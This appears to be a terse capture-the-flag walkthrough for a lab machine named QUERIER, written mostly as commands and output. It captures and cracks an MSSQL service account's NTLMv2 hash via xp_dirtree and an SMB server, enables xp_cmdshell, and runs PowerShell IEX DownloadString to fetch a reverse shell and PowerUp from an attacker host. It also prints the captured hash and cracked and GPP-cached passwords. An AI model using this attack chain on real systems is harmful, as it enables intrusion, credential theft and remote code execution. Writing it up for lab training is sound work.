after connecting into sql with sqsh we push our smbserver and get htlmv2 hash mssql-svc
in attacking host:
sudo impacket-smbserver share ./ -smb2support
in target host:
1> EXEC master..xp_dirtree '\\10.10.14.14\share\'
2> go

mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:ca2e1dc793dc91c593a8672f7f56b6b3:01010000000000000001d58e8178db01bdd6dfd82877d3bc00000000010010006c005200700056004500780051004e00030010006c005200700056004500780051004e00020010006400620062006300730049007a004200040010006400620062006300730049007a004200070008000001d58e8178db01060004000200000008003000300000000000000000000000003000009e30712d452f598a920114b05c9e881eff5ab5d56797431b46d9d18f6910987c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000

we cracked this hash: corporate568

after login in msssql-svc account we get access to xp_cmdsheel
1> EXECUTE sp_configure 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to
install.
1> RECONFIGURE
2> go
1> EXECUTE sp_configure 'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> RECONFIGURE
2> go
1> xp_cmdshell "whoami /all"
2> go
upload powerup
1> xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/Invoke-PowerShellTcp.ps1')"
2> go
we also add PowerUp 
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/PowerUp.ps1')

use this command:
Invoke-AllChecks

and found this credentials:
Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files

we can get access with psexec 